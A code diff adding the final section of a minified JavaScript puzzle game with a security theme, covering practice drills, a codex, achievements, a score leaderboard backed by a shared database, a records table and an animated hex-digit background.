+  keyFn=e=>{const i=+e.key-1;if(i>=0&&i<CLASSES.length&&rk>=CLASSES[i].rank){go(i);return true}if(e.key==='Enter'){const j=CLASSES.findIndex(c=>c.id===S.cls);go(j>=0&&rk>=CLASSES[j].rank?j:0);return true}}}
+function practice(d){_r=Math.random;run=null;hud();
+  show(`<section class="stack">${backBtn}<div><span class="gtag">Practice</span><h2>Pick a drill</h2></div><div class="row"><span class="lab">Difficulty</span><button class="btn sm" id="dm">−</button><span class="pips">${pips(d)}</span><button class="btn sm" id="dp">+</button></div>
+   <div class="cards">${Object.entries(G).map(([id,g])=>`<button class="card" data-id="${id}"><span class="glyph">${g.glyph}</span><h3>${g.name}</h3><p>${g.tag}</p><div class="meta">${starsHTML(id)}<span>${S.g[id]?S.g[id].w+' / '+S.g[id].p+' won':'new'}</span></div></button>`).join('')}</div><p class="hint">Stars: one for 2 wins, two for 8 wins, three for 8 flawless clears. Runs count too.</p></section>`);
+  $('#back').onclick=home;$('#dm').onclick=()=>practice(Math.max(1,d-1));$('#dp').onclick=()=>practice(Math.min(9,d+1));
+  $$('.card').forEach(b=>b.onclick=()=>pracPlay(b.dataset.id,d))}
+function pracPlay(id,d){playGame(id,d,{label:'Practice'},res=>{stat(id,res);if(res.win){sfx.win();burst();S.xp+=5;persist()}else{sfx.lose();hurt()}
+  show(`<section class="result ${res.win?'win':'lose'}"><span class="gtag">Practice · ${G[id].name}</span><h2>${res.win?(res.perfect?'Flawless.':'Cleared.'):'Not this time.'}</h2>${res.note?`<p class="mono">${esc(res.note)}</p>`:''}${learnHTML(res)}
+   <div class="row"><button class="btn primary" id="again">Again<kbd>↵</kbd></button>${d<9?'<button class="btn" id="harder">Harder</button>':''}<button class="btn" id="back">Drills</button></div></section>`);
+  $('#again').onclick=()=>pracPlay(id,d);if($('#harder'))$('#harder').onclick=()=>pracPlay(id,d+1);$('#back').onclick=()=>practice(d);keyFn=e=>{if(e.key==='Enter'){pracPlay(id,d);return true}}})}
+function codex(){show(`<section class="stack">${backBtn}<div><span class="gtag">Codex · ${Object.keys(S.codex).length} of ${Object.keys(CODEX).length}</span><h2>What you have learned</h2></div><div class="codex">${Object.keys(CODEX).map(k=>S.codex[k]?entryHTML(k):`<div class="entry locked"><h3>Locked</h3><p>Found in ${G[CODEX[k][2]].name}.</p></div>`).join('')}</div></section>`);$('#back').onclick=home}
+function achs(){show(`<section class="stack">${backBtn}<div><span class="gtag">Achievements</span><h2>${Object.keys(S.ach).length} of ${Object.keys(ACH).length} earned</h2></div><div class="achs">${Object.entries(ACH).map(([k,a])=>`<div class="ach ${S.ach[k]?'got':''}"><b>${a[0]}</b><p>${a[1]}</p></div>`).join('')}</div></section>`);$('#back').onclick=home}
+
+/* ---------- shared leaderboard (lights up only where the viewer has access) ---------- */
+let DB=null,USER=null,UID=null;
+(async()=>{try{if(!window.claude||!window.claude.use)return;DB=await window.claude.use('db');USER=await window.claude.use('user');if(USER)UID=await USER.id()}catch(e){}})();
+async function postScore(r){if(!DB||!UID||!r.score)return;try{const ref=DB.doc('scores/'+UID),snap=await ref.get(),o=snap.exists?snap.data()||{}:{},k=today();
+  const n={best:Math.max(+o.best||0,r.score),daily:+o.daily||0,dailyDate:o.dailyDate||'',rank:rankOf(S.xp),runs:(+o.runs||0)+1,blitz:+o.blitz||0};
+  if(r.daily){if(n.dailyDate!==k){n.dailyDate=k;n.daily=r.score}else n.daily=Math.max(n.daily,r.score)}
+  await ref.set(n)}catch(e){}}
+async function board(tab){tab=tab||'best';
+  show(`<section class="stack">${backBtn}<div><span class="gtag">Leaderboard</span><h2>${tab==='best'?'All-time best runs':tab==='blitz'?'Blitz high scores':'Today\'s daily run'}</h2></div><div class="row"><button class="btn sm ${tab==='best'?'primary':''}" id="tb">All time</button><button class="btn sm ${tab==='daily'?'primary':''}" id="td">Today's daily</button><button class="btn sm ${tab==='blitz'?'primary':''}" id="tz">Blitz</button></div><div id="lb"><p class="mono" style="color:var(--dim)">Loading scores…</p></div><p class="hint">Scores post automatically when a run ends. Everyone you share this game with appears here once they finish a run.</p></section>`);
+  $('#back').onclick=home;$('#tb').onclick=()=>board('best');$('#td').onclick=()=>board('daily');$('#tz').onclick=()=>board('blitz');const box=$('#lb');
+  if(!DB){box.innerHTML='<p class="mono" style="color:var(--dim)">The leaderboard is not available in this view. Open the game signed in on claude.ai to see and post scores.</p>';return}
+  try{const snap=await Promise.race([DB.collection('scores').limit(200).get(),new Promise((_,j)=>setTimeout(()=>j(new Error('timeout')),10000))]);if(!box.isConnected)return;
+    const k=today();let rows=snap.docs.map(x=>({id:x.id,...(x.data()||{})})).map(x=>({id:x.id,v:tab==='best'?+x.best||0:tab==='blitz'?+x.blitz||0:(x.dailyDate===k?+x.daily||0:0),rank:Math.max(0,Math.min(RANKS.length-1,+x.rank||0))})).filter(x=>x.v>0).sort((a,b)=>b.v-a.v).slice(0,25);
+    if(!rows.length){box.innerHTML=`<p class="mono" style="color:var(--dim)">No scores yet. ${tab==='best'?'Finish a run to claim first place.':'Play today\'s daily run to set the mark.'}</p>`;return}
+    let names={};try{if(USER)names=await USER.profiles(rows.map(x=>x.id))}catch(e){}if(!box.isConnected)return;
+    box.innerHTML=`<div class="tablewrap"><table class="lb"><thead><tr><th>#</th><th>Operator</th><th>Rank</th><th class="num">Score</th></tr></thead><tbody>${rows.map((x,i)=>`<tr class="${x.id===UID?'me':''}"><td class="mono">${i+1}</td><td>${esc((names[x.id]&&names[x.id].name)||'Operator')}${x.id===UID?' (you)':''}</td><td>${RANKS[x.rank][1]}</td><td class="num">${x.v.toLocaleString()}</td></tr>`).join('')}</tbody></table></div>`}
+  catch(e){if(box.isConnected)box.innerHTML='<p class="mono" style="color:var(--dim)">Could not load scores right now. Try again in a moment.</p>'}}
+function records(){const ids=Object.keys(G),tot=ids.reduce((a,k)=>{const g=S.g[k]||{p:0,w:0,f:0};a.p+=g.p;a.w+=g.w;a.f+=g.f;return a},{p:0,w:0,f:0});
+  show(`<section class="stack">${backBtn}<div><span class="gtag">Records</span><h2>${tot.w} of ${tot.p} challenges won</h2></div><div class="tablewrap"><table class="lb"><thead><tr><th>Challenge</th><th>Mastery</th><th class="num">Won</th><th class="num">Played</th><th class="num">Flawless</th><th class="num">Win rate</th></tr></thead><tbody>${ids.map(k=>{const g=S.g[k]||{p:0,w:0,f:0};return `<tr><td>${G[k].name}</td><td>${starsHTML(k)}</td><td class="num">${g.w}</td><td class="num">${g.p}</td><td class="num">${g.f}</td><td class="num">${g.p?Math.round(g.w/g.p*100)+'%':'-'}</td></tr>`}).join('')}</tbody></table></div>
+   <div class="panel stats"><div><span class="lab">Best score</span><b>${S.best.toLocaleString()}</b></div><div><span class="lab">Runs</span><b>${S.runs}</b></div><div><span class="lab">Contracts won</span><b>${S.wins}</b></div><div><span class="lab">Total XP</span><b>${S.xp.toLocaleString()}</b></div></div></section>`);$('#back').onclick=home}
+
+/* ---------- background hex drift ---------- */
+(function(){const c=$('#bgfx');if(matchMedia('(prefers-reduced-motion:reduce)').matches)return;const x=c.getContext('2d');let w,h,cols,ys;
+  const size=()=>{w=c.width=innerWidth;h=c.height=innerHeight;cols=Math.ceil(w/34);ys=Array.from({length:cols},()=>Math.random()*h)};size();addEventListener('resize',()=>{if(innerWidth!==w||Math.abs(innerHeight-h)>120)size()});
+  setInterval(()=>{if(document.hidden)return;x.fillStyle='rgba(10,15,30,.18)';x.fillRect(0,0,w,h);x.font='13px monospace';x.fillStyle='#56d6e8';
+    for(let i=0;i<cols;i++){x.fillText((Math.random()*256|0).toString(16).padStart(2,'0'),i*34+6,ys[i]);ys[i]+=16;if(ys[i]>h&&Math.random()<.08)ys[i]=0}},90)})();
+
+window.__hx={home,blitzQ,EVENTS,G,genDec,DEC,caesar,genNet,minCut,reach,genLog,genBit,mkEmail,genRules,fwEval,PWT,QS,CODEX,setSeed:n=>{_r=mulberry(n)}};
+home();
+})();
+</script>
+
+</body>
+</html>
